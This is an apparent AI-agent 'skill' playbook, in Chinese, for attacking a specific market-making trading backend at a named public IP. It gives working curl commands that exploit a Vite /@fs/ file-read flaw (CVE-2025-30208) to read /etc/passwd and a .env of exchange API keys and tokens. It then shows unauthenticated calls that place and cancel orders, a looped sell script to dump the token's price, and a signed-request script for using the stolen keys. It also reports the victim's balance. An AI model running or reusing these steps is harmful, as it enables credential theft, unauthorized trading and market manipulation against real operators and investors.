---
name: 秦百胜·做市内府
description: >-
  大爱仙尊·GGEX 做市 Vite LFI + 无认证 MM 后端手册。CVE-2025-30208，读 .env 操纵交易。
---

> **秦百胜**
> 历经五十四次劫，劫云仍旧漫遮天。
> 胸中魂光压众生，拳里剑气纵北原。
> 时来时去四百载，无死何能生新颜？
> 弃此残躯换清风，卷席苍穹复光年！

# ggex-mm-backend-exploit（大爱仙尊）

目标须在 `授权范围`。本库已有专链时专卡赢。

## 真源

- 长文：`智道藏书/旁支传承/skills/redteam/ggex-mm-backend-exploit/SKILL.md`
- 手法：`传承/薄青·岁岁索命.md`
- 工具：`python3 炼蛊房/core_web_surface_probe.py --help`
- 路由：`python3 炼蛊房/shizhan_pack_route.py --name ggex-mm-backend-exploit`

---

# GGEX 做市系统 Vite LFI + 无认证 MM 后端 实战执行手册

> 遇到 Vite dev server 公网暴露（`--host`）的做市/交易系统，按此手册打。目标特征：`/@fs/` 路径可读服务器文件、后端 FastAPI 无认证暴露。

---

## 前置条件
- 目标 IP 开放 3000 端口（Vite）和 8001 端口（FastAPI）
- Shodan/Censys 已发现资产（如 `tgkgoldnet.cafe24.com`）
- 无认证即可访问 :8001 的全部 OpenAPI 端点

---

## 第1步：资产确认

### 1.1 确认 Vite 暴露
```bash
curl -s "http://114.207.245.67:3000/@fs/etc/passwd?import&raw??" | head -c 200
```

**成功判定**：响应含 `/etc/passwd` 内容（可能包装在 `export default "..."`）。

### 1.2 确认 MM 后端无认证
```bash
curl -s "http://114.207.245.67:8001/docs" | head -c 200
curl -s "http://114.207.245.67:8001/api/account/balances?exchange=ggex" | head -c 200
```

**成功判定**：Swagger UI 返回，余额接口返回 JSON 数据。

---

## 第2步：LFI 读取 .env 泄露凭据（CVE-2025-30208）

### 2.1 核心 Payload
```bash
curl -s "http://114.207.245.67:3000/@fs/root/MM_backend/.env?import&raw??" | head -c 1000
```

如果 `/root/MM_backend/.env` 路径失败，尝试：
- `/@fs/root/.env?import&raw??`
- `/@fs/../MM_backend/.env?import&raw??`
- `/@fs//etc/hosts?import&raw??`

### 2.2 提取关键凭据
从 `.env` 中提取：
- `GGEX_API_KEY` — GGEX 交易所 API Key
- `GGEX_SECRET_KEY` — GGEX 交易所 API Secret
- `TELEGRAM_BOT_TOKEN` — Telegram Bot Token
- `DATABASE_URL` — PostgreSQL 连接串
- `CELERY_BROKER_URL` / `CELERY_RESULT_BACKEND` — Redis 连接
- `API_BASE_URL` — 本机 :8001 地址

---

## 第3步：无认证 MM 后端账户操控

### 3.1 读余额
```bash
curl -s "http://114.207.245.67:8001/api/account/balances?exchange=ggex" | jq .
```

实测余额：约 $366,320（TGK ~$364K + USDT ~$1.8K）。

### 3.2 读挂单
```bash
curl -s "http://114.207.245.67:8001/api/orders/ggex/open" | jq .
```

### 3.3 下限价单（测试验证）
```bash
curl -s -X POST "http://114.207.245.67:8001/api/orders/ggex/orders" \
  -H "Content-Type: application/json" \
  -d '{
    "symbol": "TGKUSDT",
    "side": "buy",
    "orderType": "limit",
    "force": "gtc",
    "price": "0.01",
    "quantity": "1"
  }'
```

**成功判定**：`"status":"success"` 及临时 `orderId`。

### 3.4 撤单
```bash
# 单笔撤单
curl -s -X DELETE "http://114.207.245.67:8001/api/orders/ggex/orders/{order_id}"

# 撤销全部
curl -s -X DELETE "http://114.207.245.67:8001/api/orders/ggex/orders/all"
```

### 3.5 砸盘逻辑（概念验证，生产环境勿实际执行）
```bash
# 1. 确认 TGK 可用余额
curl -s "http://114.207.245.67:8001/api/account/balance/TGK?exchange=ggex"

# 2. 列出当前挂单
curl -s "http://114.207.245.67:8001/api/orders/ggex/open"

# 3. 撤销现有挂单（可选）
curl -s -X DELETE "http://114.207.245.67:8001/api/orders/ggex/orders/all"

# 4. 循环批量 sell 冲击 order book
for i in {1..10}; do
  curl -s -X POST "http://114.207.245.67:8001/api/orders/ggex/orders" \
    -H "Content-Type: application/json" \
    -d '{"symbol":"TGKUSDT","side":"sell","orderType":"limit","force":"gtc","price":"0.01","quantity":"1000"}'
done
```

**不可执行**：提币、站内转账（GGEX API 无对应端点）。

---

## 第4步：直连 GGEX 官方 API（绕过 IP 白名单）

如果目标机可 SSH 或反弹 Shell 拿到，可在本地用泄露的 Key 直连：

```python
import time, hmac, hashlib, urllib.parse, requests

API_KEY = "<GGEX_API_KEY>"
SECRET = "<GGEX_SECRET_KEY>"
BASE = "https://userapi.ggex.io"

def signed_get(path, params=None):
    params = dict(params or {})
    ts = int(time.time() * 1000)
    recv = 5000
    params.update({"timestamp": ts, "recvWindow": recv})
    qs = urllib.parse.urlencode(sorted(params.items()))
    msg = f"{ts}{API_KEY}{recv}{qs}"
    sig = hmac.new(SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()
    url = f"{BASE}{path}?{qs}&signature={sig}"
    headers = {"X-MBX-APIKEY": API_KEY}
    return requests.get(url, headers=headers).text

# 查余额（需从白名单 IP 发起）
print(signed_get("/api/v1/account/AccountInfomation"))

# 查挂单
print(signed_get("/api/v1/account/OpenOrderList", {"symbol": "TGKUSDT"}))
```

**注意**：外网直连返回 `-600102`，IP 白名单绑定 `114.207.245.67`，必须通过目标机本地代理。

---

## 第5步：诚实收尾

**已攻破项（✅）**：
1. CVE-2025-30208 LFI 读 `.env` 成功
2. GGEX API Key / Secret 泄露
3. MM 后端 :8001 无认证暴露，104 端点可直接调用
4. 余额/挂单/下单/撤单全部验证成功
5. Telegram Bot Token 泄露

**未攻破项 / 限制（⚠️）**：
1. 外网直连 GGEX 官方 API 被 IP 白名单拦截
2. 提币/站内转账无对应端点
3. 单笔大额（接近全余额）曾报余额不足，建议单笔 ≤ 50000 USDT

**当前余额**：约 $366,320（TGK ~$364K + USDT ~$1.8K）

---

## 硬规则
1. 不伪造 CVE/凭证
2. 实际到账/200/数据量才标 ✅
3. 生产环境勿重复下单，避免实际操纵市场
